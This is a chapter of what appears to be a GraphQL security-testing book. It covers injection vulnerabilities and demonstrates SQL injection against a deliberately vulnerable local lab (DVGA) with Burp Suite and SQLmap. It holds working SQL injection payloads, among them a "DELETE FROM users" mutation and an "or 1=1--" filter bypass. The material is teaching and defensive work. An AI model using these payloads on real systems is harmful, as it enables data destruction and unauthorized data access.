<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 8: Injection</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:c77cce49-9403-4fd1-99ba-33d115574b0c" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_187" title="187"/><a class="XrefDestination" id="8"/><span class="XrefDestination" id="xref-502840c08-001"/>8</span><br/>
<span class="ChapterTitle"><a class="XrefDestination" id="injection"/><span class="XrefDestination" id="xref-502840c08-002"/>Injection</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">Clients interact with APIs in a variety of ways, such as by creating, modifying, or deleting data. Challenges arise when applications must handle their arbitrary input. Should applications ever trust the input external clients send? What about internal clients?</p>
<p>In this chapter, you’ll learn about injection vulnerabilities and discover why it is important to identify and secure the various entry points into applications backed by a GraphQL API, as well as the consequences of not doing so. We will identify opportunities to influence an application’s logic and manipulate it to take actions it wasn’t specifically designed to do. Successful injection can lead to outcomes ranging from web page manipulation to the execution of code on a database.</p>
<p>GraphQL servers typically work with a datastore, such as relational databases like MySQL, document databases like Elasticsearch, key/value stores like Redis, or even graph databases like Neo4j. All of these can be <span epub:type="pagebreak" id="Page_188" title="188"/>vulnerable to injection-based vulnerabilities. In this chapter, we’ll discuss three types of injection vulnerabilities. Some, like SQL injection (SQLi) and operating system command injection, impact backend services such as servers and databases. The other, XSS, impacts clients.</p>
<h2 id="h1-502840c08-0001"><a class="XrefDestination" id="InjectionVulnerabilitiesinGraphQL"/><span class="XrefDestination" id="xref-502840c08-003"/>Injection Vulnerabilities in GraphQL</h2>
<p class="BodyFirst">Injection vulnerabilities occur when an application accepts and processes untrustworthy input without any sanitization. <em>Sanitization</em> is a security measure that involves checking input and removing potentially dangerous characters from it. The absence of such a check could allow the input to be interpreted as a command or a query and execute on either the client side or server side. Injection is a broad class of attacks that can impact a network ecosystem, such as operating systems, clients’ browsers, databases, third-party systems, and so on.</p>
<p>An application could accidentally introduce injection vulnerabilities in a variety of ways, including the following:</p>
<ul class="disc">
<li>The application does not implement security checks on the input it receives.</li>
<li>The application uses insecure libraries (such as a parser) to process user input.</li>
<li>The application passes the received user input to a third system, which doesn’t implement security checks on the input.</li>
<li>The application accepts input and displays it to the client without transforming it in any way.</li>
</ul>
<p>An application that implements a GraphQL API can become vulnerable to injection vulnerabilities after it starts allowing clients to manipulate data through interfaces such as the arguments of queries, mutations, or subscriptions. Even a GraphQL API that allows clients to only read data might have vulnerabilities in certain interfaces, such as query filters. While the risk can be decreased, it is almost never zero.</p>
<p>Accepting user input is hard to avoid completely when building APIs. As the application becomes more complex, it will need some sort of input to be useful. For example, websites like Twitter or Facebook would be completely pointless if they didn’t allow user input. User actions, like tweeting, writing a Facebook post on someone’s wall, or uploading a dinner photo to Instagram, all require user input.</p>
<h3 id="h2-502840c08-0001"><a class="XrefDestination" id="TheBlastRadiusofMaliciousInput"/><span class="XrefDestination" id="xref-502840c08-004"/>The Blast Radius of Malicious Input</h3>
<p class="BodyFirst">Whether it comes from human clients, or machines such as other servers on the network, it is important to consider that input can be malicious. Even internal machines could become compromised and send malicious input to other servers.</p>
<p><span epub:type="pagebreak" id="Page_189" title="189"/>Applications are often developed under a relaxed trust model. Such a trust model assumes that input coming into the GraphQL API from other internal systems on the same network is safe, while input that originates from external sources is unsafe. This approach is very common, but designing systems in this way can backfire; if we are able to hack a system and send commands to another host on the network, we could easily move laterally to other servers. <a href="#figure8-1" id="figureanchor8-1">Figure 8-1</a> illustrates a similar scenario.</p>
<figure>
<img alt="" class="" src="image_fi/502840c08/f08001.png"/>
<figcaption><p><a id="figure8-1">Figure 8-1</a>: Network trust boundaries</p></figcaption>
</figure>
<p>This figure describes a penetration test in which we’ve identified an internet-facing GraphQL API server, the <em>public server</em>. This server happens to be dual-homed, meaning it has two network interfaces and is part of two separate networks. The server is vulnerable to injection attacks, as it does not adequately check the incoming queries it receives from clients.</p>
<p>Now, imagine that the <em>internal server</em> in the diagram is also a GraphQL server designed to trust any incoming queries from systems on the same network. It was configured in this way because it is not internet facing, and the security architects, in their threat model, assumed the local network was safe. Yet if the public server is hacked, an attacker could send malicious queries to the internal server.</p>
<p>This is why it is important to always perform security checks on any user input. It is also why it’s crucial for hackers to test for injection vulnerabilities wherever we identify that input is allowed.</p>
<h3 id="h2-502840c08-0002"><a class="XrefDestination" id="InjectionandtheOWASPTop10"/><span class="XrefDestination" id="xref-502840c08-005"/>The OWASP Top 10</h3>
<p class="BodyFirst">Every few years, OWASP releases new vulnerability class rankings for web applications under the <em>OWASP Top 10</em> project to help companies focus their security mitigation efforts on the most prevalent software flaw classes.</p>
<p>The injection vulnerability class has been on the OWASP Top 10 list for almost two decades. In the latest OWASP Top 10 release, injection vulnerability was ranked third, as shown in <a href="#table8-1" id="tableanchor8-1">Table 8-1</a>.</p>
<figure>
<figcaption class="TableTitle"><p><a id="table8-1">Table 8-1</a>: OWASP Top 10<span epub:type="pagebreak" id="Page_190" title="190"/></p></figcaption>
<table border="1" id="table-502840c08-0001">
<thead>
<tr>
<td><b>Identifier</b></td>
<td><b>Vulnerability</b></td>
</tr>
</thead>
<tbody>
<tr>
<td>A01</td>
<td>Broken access control</td>
</tr>
<tr>
<td>A02</td>
<td>Cryptographic failures</td>
</tr>
<tr>
<td>A03</td>
<td>Injection</td>
</tr>
<tr>
<td>A04</td>
<td>Insecure design</td>
</tr>
<tr>
<td>A05</td>
<td>Security misconfiguration</td>
</tr>
<tr>
<td>A06</td>
<td>Vulnerable and outdated components</td>
</tr>
<tr>
<td>A07</td>
<td>Identification and authentication failures</td>
</tr>
<tr>
<td>A08</td>
<td>Software and data integrity failures</td>
</tr>
<tr>
<td>A09</td>
<td>Security logging and monitoring failures</td>
</tr>
<tr>
<td>A10</td>
<td>Server-side request forgery</td>
</tr>
</tbody>
</table>
</figure>
<p>OWASP has also started tracking top vulnerabilities in APIs under a dedicated project, the <em>API Security Top 10</em>. This split helps distinguish between API- and non-API-based vulnerabilities. In the latest project release as of this writing, injection was ranked eighth, as shown in <a href="#table8-2" id="tableanchor8-2">Table 8-2</a>.</p>
<figure>
<figcaption class="TableTitle"><p><a id="table8-2">Table 8-2</a>: API Security Top 10</p></figcaption>
<table border="1" id="table-502840c08-0002">
<thead>
<tr>
<td><b>Identifier</b></td>
<td><b>Vulnerability</b></td>
</tr>
</thead>
<tbody>
<tr>
<td>API1</td>
<td>Broken object-level authorization</td>
</tr>
<tr>
<td>API2</td>
<td>Broken user authentication</td>
</tr>
<tr>
<td>API3</td>
<td>Excessive data exposure</td>
</tr>
<tr>
<td>API4</td>
<td>Lack of resource and rate limiting</td>
</tr>
<tr>
<td>API5</td>
<td>Broken function-level authorization</td>
</tr>
<tr>
<td>API6</td>
<td>Mass assignment</td>
</tr>
<tr>
<td>API7</td>
<td>Security misconfiguration</td>
</tr>
<tr>
<td>API8</td>
<td>Injection</td>
</tr>
<tr>
<td>API9</td>
<td>Improper asset management</td>
</tr>
<tr>
<td>API10</td>
<td>Insufficient logging and monitoring</td>
</tr>
</tbody>
</table>
</figure>
<p>Injection vulnerabilities can have devastating consequences in APIs, and it is important to become comfortable with injection testing in both non-API-based web applications and APIs when performing penetration tests.</p>
<h2 id="h1-502840c08-0002"><a class="XrefDestination" id="TheGraphQLInjectionSurface"/><span class="XrefDestination" id="xref-502840c08-006"/>The Injection Surface</h2>
<p class="BodyFirst">GraphQL APIs are typically designed to accept input from clients, perform backend actions such as database reading and writing, and return a response.</p>
<p><span epub:type="pagebreak" id="Page_191" title="191"/>Technically, you can have read-only queries such as the following, which doesn’t change anything on the server side. Clients can’t use the query to pass arbitrary data, only the GraphQL fields <code>id</code> and <code>ipAddr</code>, which are defined in the GraphQL schema, as you might remember from <span class="xref" itemid="xref_target_Chapter 3">Chapter 3</span>:</p>
<pre><code>query {
   pastes {
      id
      ipAddr
   }
}</code></pre>
<p>An application developer can get away with having only read-only operations if the application wasn’t designed to interact with clients in ways that allow them to modify data on the server, but in reality, this will almost never be the case. As applications become more complex and feature rich, they’ll need to accept client input through interfaces such as query arguments, field arguments, or both.</p>
<p>Let’s consider a few GraphQL components that allow clients to pass arbitrary inputs before diving into the various injection vulnerabilities. For each of these interfaces, you should ask yourself a few important questions:</p>
<ul class="disc">
<li>Is the application verifying the incoming client input at all?</li>
<li>Does the application accept dangerous characters?</li>
<li>Does the application throw exceptions when unexpected characters are sent as part of a query?</li>
<li>Does GraphQL check the value type passed to the arguments?</li>
<li>Can we infer from the GraphQL server response (or out-of-band response) whether an injection attempt was successful?</li>
</ul>
<p>Injection tests will require some trial and error, but once you experience a breakthrough, you’ll have a very satisfying feeling.</p>
<h3 id="h2-502840c08-0003"><a class="XrefDestination" id="QueryArguments"/><span class="XrefDestination" id="xref-502840c08-007"/>Query Arguments</h3>
<p class="BodyFirst">GraphQL operations such as queries, mutations, and subscriptions can be designed to accept arguments. Consider the following query, which passes a <code>limit</code> argument with an integer value of <code>100</code>. While this operation is still read-only, it provides an interface for manipulating the server’s response through the use of query filters:</p>
<pre><code>query {
   pastes(<b>limit: 100</b>) {
      id
      ipAddr
   }
}</code></pre>
<p>This argument doesn’t allow us to execute code, but we could use it to influence the server in a variety of ways. For example, providing a negative <span epub:type="pagebreak" id="Page_192" title="192"/>value (such as <code>-1</code>) to an <code>Int</code>-type argument such as <code>limit</code> could result in unexpected behaviors. Sometimes APIs interpret <code>-1</code> value as <em>return all</em>, in which case the server will return the entire list of objects.</p>
<p>When you identify an argument of type <code>String</code>, you might want to spend some time experimenting with various injection payloads. Consider the GraphQL mutation in <a href="#listing8-1" id="listinganchor8-1">Listing 8-1</a>, which uses the <code>createPaste</code> top-level field.</p>
<pre><code>mutation {
 createPaste(content: "Some content", title:"Some title", public: false) {
   paste {
    id
    ipAddr
   }
 }
}</code></pre>
<p class="CodeListingCaption"><a id="listing8-1">Listing 8-1</a>: Mutation input points</p>
<p>The <code>createPaste</code> field is pretty self-explanatory; it takes information from the client and uses that data to create a brand-new paste in the database. In this example, the client controls the paste’s format via three arguments to <code>createPaste</code>: <code>content</code>, <code>title</code>, and <code>public</code>. These arguments are of different types. For example, <code>content</code> and <code>title</code> are of the scalar type <code>String</code>, while <code>public</code> is of the scalar type <code>Boolean</code>.</p>
<p>Imagine how a paste creation operation might look from a database operation perspective. Consider the following SQL example:</p>
<pre><code>INSERT INTO pastes (content, title, public)
VALUES ('some_malicious_content', 'some_title', false)</code></pre>
<p>When a client query is received by a GraphQL API, the server may need to look up information in or write information to a database in order to fulfill the query. If the GraphQL API is designed to process input from arguments such as <code>content</code> and <code>title</code> without proper security validations, data can be injected directly into the SQL command, which could allow for a SQLi vulnerability.</p>
<p>Consider the following SQLi example, in which a SQL command is inserted into the <code>content</code> argument:</p>
<pre><code>mutation {
 createPaste(content: "<b>content'); DELETE FROM users; --</b>") {
   paste {
    id
    ipAddr
   }
 }
}</code></pre>
<p>A query crafted this way could be converted to a SQL query on the backend, and it may look like this:</p>
<pre><code>INSERT INTO pastes (content) VALUES ('<b>content'); DELETE FROM users; --</b></code></pre>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<span epub:type="pagebreak" id="Page_193" title="193"/><h2><span class="NoteHead">Note</span></h2>
<p>	GraphQL is <em>strongly</em> <em>typed</em>. This means that it will reject any type mismatches when it sees them. For instance, an argument of type <code>Boolean</code> should not accept a value of type <code>String</code>, only <code>true</code> or <code>false</code> values. Values provided to arguments are validated against the GraphQL schema when a query is processed during the validation phase.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>It is important to note that GraphQL APIs could (and should) have multiple layers of defensive checks in the query resolvers to mitigate against any forms of injection.</p>
<h3 id="h2-502840c08-0004"><a class="XrefDestination" id="FieldArguments"/><span class="XrefDestination" id="xref-502840c08-008"/>Field Arguments</h3>
<p class="BodyFirst">Just like top-level fields, GraphQL fields in selection sets can also take arguments. Consider the following query:</p>
<pre><code>query {
  users {
    username(capitalize: true)
    id
  }
}</code></pre>
<p>Using this query, we can return a list of users’ IDs and usernames. By default, the <code>username</code> field is lowercase in the response. Adding the <code>capitalize</code> argument and setting it to <code>true</code> results in the GraphQL resolver capitalizing the username.</p>
<p>Field arguments could be implemented to take different actions when specified in a field and, in a security context, aren’t that different from other arguments (such as arguments to directives). Values passed to field arguments can be inserted into a database or influence logic. The application might even use them as part of a different internal API call, so it’s important to test these when they exist.</p>
<h3 id="h2-502840c08-0005"><a class="XrefDestination" id="QueryDirectiveArguments"/><span class="XrefDestination" id="xref-502840c08-009"/>Query Directive Arguments</h3>
<p class="BodyFirst">The query directives attached to certain GraphQL fields can also accept arguments, often of scalar types such as <code>String</code> and <code>Boolean</code>. The way these directives are used is completely implementation dependent, but it’s always worth checking which kinds of values they allow a client to send.</p>
<p>Consider the following query:</p>
<pre><code>query {
  pastes {
    id
    ipAddr @show_network(style: "cidr")
  }
}</code></pre>
<p>In this example, we specify an argument named <code>style</code> to the directive <code>show_network</code>. The <code>style</code> argument is of type <code>String</code>, and it accepts arbitrary strings. In this example, we supply <code>cidr</code> as the value. In the backend, this will transform the <code>ipAddr</code> (IP address) field into an address using <em>Classless <span epub:type="pagebreak" id="Page_194" title="194"/>Inter-Domain Routing (CIDR)</em> notation. For example, the IPv4 address 192.168.0.1 will become 192.168.0.1/32.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	If introspection is enabled, GraphQL IDE tools such as GraphiQL Explorer or GraphQL Playground will auto-complete directive names and their arguments as soon as you start typing the at symbol (<code>@</code>) on a field. The same is true for fields and their arguments.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Query directive arguments can be prone to injections too. Attackers can use them to influence the way the server returns the response to the specific field. For instance, a query directive might use the argument <code>where</code>, which then gets translated to a SQL-matching pattern (for example, the <code>LIKE</code> operator).</p>
<p>You can use the introspection query shown in <a href="#listing8-2" id="listinganchor8-2">Listing 8-2</a> to get only the available directives by using the <code>__schema</code> meta-field with the <code>directives</code> field.</p>
<pre><code>query GetDirectives {
  __schema {
    directives {
      name
      description
      locations
    }
  }
}</code></pre>
<p class="CodeListingCaption"><a id="listing8-2">Listing 8-2</a>: A GraphQL introspection query used to list directives</p>
<h3 id="h2-502840c08-0006"><a class="XrefDestination" id="OperationNames"/><span class="XrefDestination" id="xref-502840c08-010"/>Operation Names</h3>
<p class="BodyFirst"><em>Operation names</em> are strings we can add to GraphQL operations such as queries, mutations, or subscriptions. They are often used to uniquely name each query when multiple queries are sent together. GraphQL graphical IDEs such as GraphiQL Explorer and GraphQL Playground use the operation name as a way to allow clients to choose which operation to run when more than one query exists in a document through a drop-down menu, as shown in <a href="#figure8-2" id="figureanchor8-2">Figure 8-2</a>.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08002.png"/>
<figcaption><p><a id="figure8-2">Figure 8-2</a>: Executing a selected query based on its operation name in GraphiQL Explorer</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_195" title="195"/>Operation names are also used for other purposes, such as debugging and logging. In fact, they are interesting potential injection vectors because applications can use them in many ways. For instance, some applications use operation names for analytics, to determine which queries clients use the most. The operation name string could end up in different systems, such as logging systems, relational databases, cache databases, and so on. It is important to check whether the GraphQL API allows special characters as part of the operation name, as this could turn out to be an injectable interface.</p>
<p>Operation names are typically alphanumeric, but some GraphQL server implementations are more permissive than others when it comes to the type of characters they permit.</p>
<h2 id="h1-502840c08-0003"><a class="XrefDestination" id="GraphQLInputEntryPoints"/><span class="XrefDestination" id="xref-502840c08-011"/>Input Entry Points</h2>
<p class="BodyFirst">When attempting to perform injection testing against GraphQL APIs, we need to find a way to discover input entry points. If we are lucky and introspection is left enabled, we can often quickly access the various queries, mutations, and subscriptions that the API supports, along with information about its types, fields, arguments, and so on, using a GraphQL IDE tool like Altair, GraphiQL Explorer, or GraphQL Playground.</p>
<p>To view this information about DVGA in Altair, set the URL to <b><i>http://localhost:5013/graphiql</i></b> and click the <b>Save</b> button (the diskette icon) located at the top right. Click the <b>Refresh</b> button located next to the Save button, and then click <b>Docs</b>. You should see a section for queries, mutations, and subscriptions. Click any of them to see the types of arguments that exist within each, as shown in the screenshot in <a href="#figure8-3" id="figureanchor8-3">Figure 8-3</a>.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08003.png"/>
<figcaption><p><a id="figure8-3">Figure 8-3</a>: Schema documentation in the Altair client</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_196" title="196"/>If luck isn’t on our side and introspection was disabled on the server, we can lean on tools such as Clairvoyance, which we touched on in <span class="xref" itemid="xref_target_Chapter 6">Chapter 6</span>, to reconstruct the schema and discover the various available inputs. Clairvoyance will fuzz the GraphQL document inputs to discover all of its various operations, fields, types, and arguments necessary to rebuild the complete schema view, which we can then use to identify all possible inputs.</p>
<p>We will next explore how common types of injections could look in the GraphQL world by performing some injection testing against DVGA.</p>
<h2 id="h1-502840c08-0004"><a class="XrefDestination" id="SQLInjection"/><span class="XrefDestination" id="xref-502840c08-012"/>SQL Injection</h2>
<p class="BodyFirst"><em>SQL injection </em>is one of the oldest types of vulnerabilities out there. SQLi vulnerabilities happen when client input is directly inserted into a SQL command without proper character escaping. This condition allows a hacker to close out the intended SQL query and introduce their own SQL command, effectively interfering with the query the application makes to its database.</p>
<p>A SQLi vulnerability in GraphQL APIs could have devastating consequences. Full or even partial access to a database could result in any of the following consequences:</p>
<ul class="disc">
<li><b>Impact to data integrity. </b>A SQLi vulnerability could allow us to manipulate data, such as by altering data within a database table.</li>
<li><b>Impact to data confidentiality.</b> SQLi could allow us to leak information from a database, either from the application’s specific SQL tables or from other tables in the same database. This information could include PII, password hashes, sensitive tokens, and so on.</li>
<li><b>Impact to data availability.</b> SQLi could allow us to delete segments of the database or completely drop its tables, resulting in data loss and application instabilities.</li>
</ul>
<p>In recent years, modern web frameworks have gotten better at mitigating SQLi vulnerabilities by offering out-of-the-box defense mechanisms such as parameterized queries. Utilizing audited and vetted frameworks enables developers to write code more securely by using the framework’s built-in security features, such as through functions and libraries.</p>
<h3 id="h2-502840c08-0007"><a class="XrefDestination" id="UnderstandingtheTypesofSQLInjection"/><span class="XrefDestination" id="xref-502840c08-013"/>Understanding the Types of SQL Injection</h3>
<p class="BodyFirst">There are two categories of SQLi vulnerabilities, each of which has a few subcategories.</p>
<h4 id="h3-502840c08-0001"><a class="XrefDestination" id="ClassicSQLInjection"/><span class="XrefDestination" id="xref-502840c08-014"/>Classic SQL Injection</h4>
<p class="BodyFirst">You know you’ve run into <em>classic SQLi</em> when the application returns SQL query errors during injection testing. These errors can be displayed directly in the web page or become apparent through network inspection. Two techniques are used to identify a classic SQLi vulnerability: error based and union based.</p>
<p><em>Error-based SQLi</em> is used to identify SQLi vulnerabilities through error observation. Applications that throw SQL errors to the client as a result of <span epub:type="pagebreak" id="Page_197" title="197"/>a failure in SQL query execution could allow us to find the right attack pattern to successfully exploit the SQLi vulnerability.</p>
<p><em>Union-based SQLi</em> is used to identify SQLi vulnerabilities by leveraging the <code>UNION</code> SQL operator. <code>UNION</code> concatenates results of multiple <code>SELECT</code> statements, which can then be returned to the client.</p>
<h4 id="h3-502840c08-0002"><a class="XrefDestination" id="BlindSQLInjection"/><span class="XrefDestination" id="xref-502840c08-015"/>Blind SQL Injection</h4>
<p class="BodyFirst">In <em>blind SQLi</em>, we are given no visible indications that a vulnerability exists. Applications could fail silently or redirect their errors to somewhere other than the client. Two discovery techniques apply to the blind SQLi category.</p>
<p><em>Time-based SQLi</em> forces the application to wait for a certain amount of time before returning a response. By supplying a SQLi payload that instructs the database to wait for a certain number of seconds, we can infer that the application is vulnerable if a similar delay occurs in returning the final response.</p>
<p><em>Boolean-based SQLi</em> allows us to infer whether the application is vulnerable to SQLi by constructing a payload that will return a Boolean result such as <code>true</code> or <code>false</code>. By using this testing technique, we could influence the way the application presents data to the client, which helps us identify whether the vulnerability exists.</p>
<h3 id="h2-502840c08-0008"><a class="XrefDestination" id="TestingforSQLi"/><span class="XrefDestination" id="xref-502840c08-016"/>Testing for SQLi</h3>
<p class="BodyFirst">While SQLi vulnerabilities are on the decline, they can still be found occasionally. As hackers, we should assume that the application we’re testing may not have the appropriate controls in place to prevent SQLi and test for it wherever and whenever possible.</p>
<p>Testing for SQLi can be done in a variety of ways, such as the following:</p>
<ul class="disc">
<li>Submitting characters like single (<code>'</code>) or double (<code>"</code>) quotes and observing how the application handles unexpected inputs and errors.</li>
<li>Fuzzing input fields and observing application errors that may indicate database query failures.</li>
<li>Submitting SQL commands that introduce delays, such as by using <code>BENCHMARK</code> and <code>SLEEP</code> for MySQL databases, <code>WAITFOR</code> <code>DELAY</code> and <code>WAITFOR</code> <code>TIME</code> for Microsoft SQL Server, or <code>pg_sleep</code> for PostgreSQL databases, and then performing a response-timing analysis to identify whether the injection was successful. This is especially helpful when we are performing blind SQLi testing, whereby application errors are invisible to us.</li>
</ul>
<p>SQLi in GraphQL can be introduced through any interface that accepts client input. In this section, we will explore a SQLi example in GraphQL by using DVGA.</p>
<h3 id="h2-502840c08-0009"><a class="XrefDestination" id="TestingDVGAforSQLiwithBurpSuite"/><span class="XrefDestination" id="xref-502840c08-017"/>Testing DVGA for SQLi with Burp Suite</h3>
<p class="BodyFirst">The first step to injection testing in GraphQL is to find places where we can make alterations to queries. We can start by looking at the schema <span epub:type="pagebreak" id="Page_198" title="198"/>documentation in Altair. <a href="#figure8-4" id="figureanchor8-4">Figure 8-4</a> shows the Query section. The documentation also has mutation and subscription sections, so have a look at those too.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08004.png"/>
<figcaption><p><a id="figure8-4">Figure 8-4</a>: Queries in DVGA</p></figcaption>
</figure>
<p>As you can see, we have a few queries to choose from. Now we must prioritize which areas to focus on. Notice that a few fields, such as <code>systemUpdate</code>, <code>systemHealth</code>, <code>audits</code>, and <code>deleteAllPastes</code>, don’t take any kinds of arguments, so we are better off focusing on the ones that do. Let’s zoom in on the <code>pastes</code> field, which takes three optional arguments:</p>
<ul class="disc">
<li><code>public</code>, of type <code>Boolean</code></li>
<li><code>limit</code>, of type <code>Integer</code></li>
<li><code>filter</code>, of type <code>String</code></li>
</ul>
<p>The <code>filter</code> argument could be a valuable candidate for SQLi testing, because it accepts string values and its name implies that it filters results. This filtering could involve backend query resolver logic that uses SQL operations, such as the SQL <code>WHERE</code> operator, in order to fulfill a query.</p>
<p>Now that we have a target, let’s begin interacting with DVGA and proxying traffic. Open Burp Suite through Kali’s <b>Applications</b> menu, and then click <b>Open Browser</b> to open the built-in browser located under the <b>Proxy</b> tab and navigate to <b><i>http://localhost:5013</i></b>. After the application loads, make sure Burp Suite is in <b>Intercept</b> mode. Navigate to the <b>Private Pastes</b> page in DVGA located in the left sidebar. You should see a GraphQL request similar to the one in <a href="#figure8-5" id="figureanchor8-5">Figure 8-5</a>.</p>
<span epub:type="pagebreak" id="Page_199" title="199"/><figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08005.png"/>
<figcaption><p><a id="figure8-5">Figure 8-5</a>: Intercepting a GraphQL query in Burp Suite</p></figcaption>
</figure>
<p>As you can see, DVGA sends an HTTP POST request using the GraphQL <code>pastes</code> query operation to get the list of private pastes from the GraphQL API server.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	If you don’t immediately see the initial POST request to <em>/graphql</em>, click Forward until it appears.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>If you switch to the WebSockets History tab, you will notice that DVGA uses the subscription operation as well (<a href="#figure8-6" id="figureanchor8-6">Figure 8-6</a>). The subscription operation in this context allows the client to read new pastes from the API as soon as they are created by subscribing to the <code>pastes</code> event.</p>
<p>To more easily manipulate requests, send the request to Burp Suite’s Repeater by right-clicking anywhere in the request window and clicking <b>Send to Repeater</b>. Then click the <b>Repeater</b> tab to see the captured request. This allows you to replay requests on demand.</p>
<p>Let’s change the query so that it uses the <code>filter</code> argument. First, modify the query to look like the following:</p>
<pre><code><b>query {</b>
<b> pastes(filter:"My First Paste") {</b>
<b>    id</b>
<b>    content</b>
<b>    title</b>
<b> }</b>
<b>}</b></code></pre>
<span epub:type="pagebreak" id="Page_200" title="200"/><figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08006.png"/>
<figcaption><p><a id="figure8-6">Figure 8-6</a>: The historical WebSocket traffic view in Burp Suite</p></figcaption>
</figure>
<p>Note that when a query contains double quotes, we must escape the quotes by using the backslash (<code>\</code>) character in Burp, as shown in <a href="#figure8-7" id="figureanchor8-7">Figure 8-7</a>.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08007.png"/>
<figcaption><p><a id="figure8-7">Figure 8-7</a>: Using Burp Repeater to send modified GraphQL queries</p></figcaption>
</figure>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<span epub:type="pagebreak" id="Page_201" title="201"/><h2><span class="NoteHead">NOTE</span></h2>
<p>	If you are using the licensed professional version of Burp Suite, you can install the GraphQL Raider plug-in from Burp’s BApp Store. Raider allows you to send native GraphQL queries from within Burp Suite without having to worry about character escaping.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Click <b>Send</b> to send the query to the GraphQL server. In response to this query, we should receive a paste that matches our filter search pattern. More specifically, it matches the <code>content</code> field:</p>
<pre><code>"pastes": [
  {
<var>    --snip--</var>
    "title":"Testing Testing",
    "content":"My First Paste"
<var>    --snip--</var>
  }
]</code></pre>
<p>This filter search pattern suggests that some sort of SQL query is happening behind the scenes and that this query behaves similarly to the following:</p>
<pre><code>SELECT id, content, title FROM pastes WHERE content LIKE 'My First Paste'</code></pre>
<p>This SQL query will return the <code>id</code>, <code>content</code>, and <code>title</code> columns from the <code>pastes</code> SQL table. Using the <code>WHERE</code> operator, the result will be filtered to return only results related to pastes that include the string <code>My</code> <code>First</code> <code>Paste</code> in their content, as defined by the <code>LIKE</code> operator.</p>
<p>We want to throw some characters at the application that would potentially break this query and result in errors, which might indicate that the application is sending our input directly into the query. For instance, the SQL query would break if we added a single quote (<code>'</code>) after the search string, because this would result in an orphaned opening single quote without a closing single quote.</p>
<p>Let’s send the following query to DVGA to see the response we receive (notice the addition of the single quote):</p>
<pre><code>query {
 pastes(filter:"<b>My First Paste'</b>") {
    id
    content
    title
 }
}</code></pre>
<p>In Burp, modify the request to look like the one shown in <a href="#figure8-8" id="figureanchor8-8">Figure 8-8</a>. GraphQL should return a response containing an application error through the <code>errors</code> JSON key that reveals some interesting information.</p>
<span epub:type="pagebreak" id="Page_202" title="202"/><figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08008.png"/>
<figcaption><p><a id="figure8-8">Figure 8-8</a>: Breaking a SQL query by using a single quote with Burp Suite</p></figcaption>
</figure>
<p>It appears that our string causes the SQL query to become invalid because it gets injected directly into the SQL <code>LIKE</code> search pattern. The application doesn’t escape the single quote we introduced, which allows us to break the SQL query altogether. Therefore, SQLite (the SQL engine that runs DVGA) throws errors, as you can see based on the string <code>sqlite3.OperationalError</code> in the error output.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	In addition to the potential SQLi vulnerability we just identified, this is also an information disclosure vulnerability, because the application did not handle the error gracefully. Application errors that leak database information are valuable because they provide us with insight into the database schema structure, such as what columns or tables exist in the backend database. This information can help us craft more precise SQLi commands.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>So, we think we’ve found a SQLi vulnerability. Now what? Well, we can check whether we are able to get additional information from the database by changing the SQL query to one that, say, returns all pastes:</p>
<pre><code> query {
  pastes(filter:"My First Paste' or 1=1--") {
    title
    content
  }
}</code></pre>
<p>Now the SQL statement GraphQL uses when it queries the database after parsing the incoming GraphQL query might look like this:</p>
<pre><code>SELECT id, content, title FROM pastes WHERE content LIKE '<b>My First Paste' or 1=1—-'</b></code></pre>
<p>By adding a single quote, we end the SQL <code>LIKE</code> operator immediately after the <code>My</code> <code>First</code> <code>Paste</code> filter pattern. Then we can introduce an <code>or</code> condition that makes the SQL query always true by adding the <code>1=1</code> comparison. We end the SQL query by using the comment double dash (<code>--</code>) syntax in <span epub:type="pagebreak" id="Page_203" title="203"/>SQL, which comments out the single quote at the end of the query, effectively ensuring that our syntax remains valid despite our alteration.</p>
<p><a href="#figure8-9" id="figureanchor8-9">Figure 8-9</a> shows what this SQLi query looks like in Burp Suite and its result.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08009.png"/>
<figcaption><p><a id="figure8-9">Figure 8-9</a>: A successful SQL injection with Burp Suite</p></figcaption>
</figure>
<p>The server response contains all pastes in the DVGA database! This is an example of a Boolean-based SQLi.</p>
<h3 id="h2-502840c08-0010"><a class="XrefDestination" id="AutomatingSQLInjection"/><span class="XrefDestination" id="xref-502840c08-018"/>Automating SQL Injection</h3>
<p class="BodyFirst">Other tools attempt to automate the detection of a SQLi vulnerability. In particular, SQLmap can help fuzz the GraphQL API with payloads that are tailored to various database engines, such as MySQL, PostgreSQL, SQLite, and so on.</p>
<p>When performing a SQLi test, you can take any potential GraphQL query and use an asterisk (<code>*</code>) to mark a specific position where SQLmap should inject payloads. For example, consider the following snippet:</p>
<pre><code>query {
  pastes(filter:"test<b>*</b>") {
     id
  }
}</code></pre>
